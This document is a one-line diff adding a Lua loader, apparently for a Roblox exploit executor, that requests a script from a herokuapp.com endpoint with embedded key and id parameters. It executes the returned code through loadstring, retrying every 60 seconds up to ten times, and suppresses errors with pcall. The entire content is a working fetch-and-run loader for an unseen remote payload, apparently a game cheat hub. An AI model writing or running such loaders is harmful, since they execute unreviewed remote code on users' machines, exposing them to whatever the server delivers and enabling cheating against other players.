@@ -1,0 +1,1 @@
+pcall(function() gets=function() return syn.request({Method="GET",Url="https://stayfrosty.herokuapp.com/getscript?d=twzEptokrdG4806WmcRG&k=Koronelover1&id=601838095721299988&d2=DracoHub"}).Body end;rt=0;repeat spawn(function() pcall(function() loadstring(gets())() end) end);rt=rt+1;wait(60) until getgenv().executed or rt >= 10 end)
